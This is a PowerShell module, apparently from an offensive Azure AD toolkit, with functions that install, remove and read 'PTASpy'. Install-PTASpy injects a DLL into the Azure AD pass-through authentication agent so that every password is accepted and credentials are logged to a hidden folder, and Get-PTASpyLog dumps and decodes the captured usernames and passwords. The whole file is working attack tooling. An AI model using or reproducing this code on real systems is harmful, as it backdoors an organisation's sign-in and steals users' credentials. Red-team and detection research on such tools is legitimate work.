# PTASpy functions

# Some constants
$serviceName = "AzureADConnectAuthenticationAgent"
$processName = "AzureADConnectAuthenticationAgentService"

# May 20th 2019
function Install-PTASpy
{
<#
    .SYNOPSIS
    Installs PTASpy to the current computer.

    .DESCRIPTION
    Installs PTASpy to the current computer. PTASpy collects credentials to C:\PTASpy.log and accepts all passwords.

#>
    [cmdletbinding()]
    Param()
    Process
    {
        # Check that the process is running..
        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if([String]::IsNullOrEmpty($process))
        {
            Write-Error "This command needs to be run on a computer with Azure AD Authentication Agent running (AzureADConnectAuthenticationAgentService.exe)."
            return
        }

        # Check the dependencies..
        if([String]::IsNullOrEmpty((Get-ChildItem -Path HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall | Get-ItemProperty | Where-Object {$_.DisplayName -like "Micraosoft Visual C++ 2015 Redistributable (x64)*"})))
        {
            Write-Warning "Microsoft Visual C++ 2015 Redistributable (x64) seems not to be installed! If PTASpy installation fails, install from: https://download.microsoft.com/download/6/A/A/6AA4EDFF-645B-48C5-81CC-ED5963AEAD48/vc_redist.x64.exe"
        }

        $processId = $process.Id
        
        $promptValue = Read-Host "Are you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort"
        if($promptValue -eq "yes")
        {
            Write-Verbose "Creating and hiding directory C:\PTASpy"
            $PTASpyDir = New-Item -ItemType Directory -Force -Path C:\PTASpy 
            $PTASpyDir.Attributes += "Hidden"

            Write-Verbose "Copying PTASpy.dll to C:\PTASpy\"
            try
            {
                Copy-Item "$PSScriptRoot\PTASpy.dll" "C:\PTASpy\" -Force
            }
            catch
            {
                Write-Error "Could not copy PTASpy.dll to C:\PTASPy - Try running Remove-AADIntPTASpy and try again"
                return
            }
 
            $result=Inject-DLL -ProcessID $processID -FileName "C:\PTASpy\PTASpy.dll"
            Write-Verbose "Inject-DLL result: $result"
            
            if($result -like "*success*")
            {
                Write-Host "Installation successfully completed!"
                Write-Host "All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv"
                return
            }
            else
            {
                Write-Error "Installation failed: $result"
                return
            }
            
            
        }
        
    }
}

# May 20th 2019
function Remove-PTASpy
{
<#
    .SYNOPSIS
    Removes PTASpy from the current computer

    .DESCRIPTION
    Removes PTASpy from the current computer by restarting AzureADConnectAuthenticationAgentService service.

#>
    [cmdletbinding()]
    Param()
    Process
    {
        $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if([String]::IsNullOrEmpty($service))
        {
            Write-Error "This command needs to be run on a computer with Azure AD Authentication Agent service (AzureADConnectAuthenticationAgent)"
            return
        }

        Restart-Service $serviceName
        Write-Verbose "Removing C:\PTASpy\PTASpy.dll"

        Remove-Item "C:\PTASpy\PTASpy.dll" -Force

        Write-Host "Service restarted and C:\PTASpy\PTASpy.dll removed."
    }
}

# May 20th 2019
function Get-PTASpyLog
{
<#
    .SYNOPSIS
    Dumps credentials collected by PTASpy

    .DESCRIPTION
    Dumps credentials from C:\PTASpy.csv collected by PTASpy and deletes the file if requested

#>
    [cmdletbinding()]
    Param(
        [Switch]$DeleteFile,
        [Switch]$DecodePasswords
    )
    Process
    {
        $fileName = "C:\PTASpy\PTASpy.csv"
        $fileContent = Get-Content $fileName

        foreach($row in $fileContent)
        {
            if(![String]::IsNullOrEmpty($row.Trim()))
            {
                $attributes=[ordered]@{}
                $values = $row.Split(",")
            
                $attributes["UserName"]=$values[0]
                if($DecodePasswords)
                {
                    $attributes["Password"]=[System.Text.Encoding]::Unicode.GetString( [System.Convert]::FromBase64String($values[3]))
                }
                else
                {
                    $attributes["Password"]=$values[3]
                }
                $date=[int]$values[2]
                # epoch from AccessToken_utils = 1.1.1970 00:00
                $attributes["Time"]=$epoch.AddSeconds($date)
            
                New-Object PSObject -Property $attributes
            }
        }
        if($DeleteFile)
        {
            Remove-Item $fileName -Force
        }
    }
}
